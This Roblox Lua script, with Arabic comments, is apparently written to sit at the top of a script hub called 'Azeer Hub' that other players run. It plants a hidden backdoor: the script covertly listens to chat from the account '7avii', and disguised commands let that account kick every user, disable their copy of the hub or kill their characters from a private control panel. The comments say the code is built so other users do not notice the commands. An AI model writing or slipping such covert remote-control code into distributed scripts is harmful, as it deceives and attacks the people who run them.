local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- اسم حسابك المعتمد كأدمن وحيد
local AdminName = "7avii"

-------------------------------------------------------------------
-- [1] نظام الاستقبال (يشتغل عند كل شخص يفتح السكربت)
-------------------------------------------------------------------
local function listenToAdminCommands(adminPlayer)
    adminPlayer.Chatted:Connect(function(msg)
        -- أوامر مخفية يتم إرسالها برمز خاص لكي لا تظهر ككلام عادي
        if string.sub(msg, 1, 7) == "7avii//" then
            local command = string.sub(msg, 8)
            
            if command == "kickall" then
                if LocalPlayer.Name ~= AdminName then
                    LocalPlayer:Kick("تم طردك بواسطة المطور 7avii")
                end
            elseif command == "stopall" then
                if LocalPlayer.Name ~= AdminName then
                    -- استبدل AzeerHub بالاسم الصحيح للـ ScreenGui الخاصة بسكربتك
                    local gui = LocalPlayer.PlayerGui:FindFirstChild("AzeerHub")
                    if gui then gui:Destroy() end
                end
            elseif command == "killall" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Health = 0
                end
            end
        end
    end)
end

-- تفعيل الاستماع للأدمن 7avii عند الجميع
for _, p in ipairs(Players:GetPlayers()) do
    if p.Name == AdminName then listenToAdminCommands(p) end
end
Players.PlayerAdded:Connect(function(p)
    if p.Name == AdminName then listenToAdminCommands(p) end
end)


-------------------------------------------------------------------
-- [2] واجهة التحكم الرسومية (تظهر لك أنت فقط 7avii)
-------------------------------------------------------------------
if LocalPlayer.Name == AdminName then
    -- إنشاء الواجهة برمجياً لكي لا يراها أحد غيرك
    local AdminGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local Title = Instance.new("TextLabel")
    local KickBtn = Instance.new("TextButton")
    local StopBtn = Instance.new("TextButton")
    local KillBtn = Instance.new("TextButton")
    
    AdminGui.Name = "AzeerAdminPanel"
    AdminGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    AdminGui.ResetOnSpawn = false
    
    -- تصميم اللوحة الخلفية
    Frame.Parent = AdminGui
    Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Frame.Position = UDim2.new(0.05, 0, 0.3, 0) -- مكانها على يسار الشاشة لتناسب الموبايل
    Frame.Size = UDim2.new(0, 160, 0, 220)
    Frame.Active = true
    Frame.Draggable = true -- يمكنك تحريكها بيدك على الشاشة
    
    -- عنوان اللوحة
    Title.Parent = Frame
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Title.Text = "7avii Admin Hub"
    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
    Title.TextSize = 16
    Title.Font = Enum.Font.SourceSansBold
    
    -- دالة لتصميم الأزرار بسرعة
    local function styleButton(btn, text, pos, color)
        btn.Parent = Frame
        btn.Size = UDim2.new(0.9, 0, 0, 40)
        btn.Position = pos
        btn.BackgroundColor3 = color
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 14
        btn.Font = Enum.Font.SourceSansBold
    end
    
    styleButton(KickBtn, "طرد الجميع (Kick)", UDim2.new(0.05, 0, 0.25, 0), Color3.fromRGB(150, 0, 0))
    styleButton(StopBtn, "تعطيل السكربت للكل", UDim2.new(0.05, 0, 0.48, 0), Color3.fromRGB(150, 100, 0))
    styleButton(KillBtn, "قتل الجميع (Kill)", UDim2.new(0.05, 0, 0.71, 0), Color3.fromRGB(50, 50, 50))
    
    -- [3] ربط الأزرار بإرسال الأوامر برمجياً
    local ChatService = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
    
    local function sendCommand(cmd)
        -- إرسال الإشارة المخفية عبر الشات الداخلي للعبة
        if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("7avii//" .. cmd)
        else
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("7avii//" .. cmd, "All")
        end
    end
    
    KickBtn.MouseButton1Click:Connect(function() sendCommand("kickall") end)
    StopBtn.MouseButton1Click:Connect(function() sendCommand("stopall") end)
    KillBtn.MouseButton1Click:Connect(function() sendCommand("killall") end)
end

-------------------------------------------------------------------
-- [4] كود سكربت Azeer Hub العادي الخاص بالناس يبدأ من هنا تحت:
-------------------------------------------------------------------
print("Azeer Hub Loaded Successfully!")
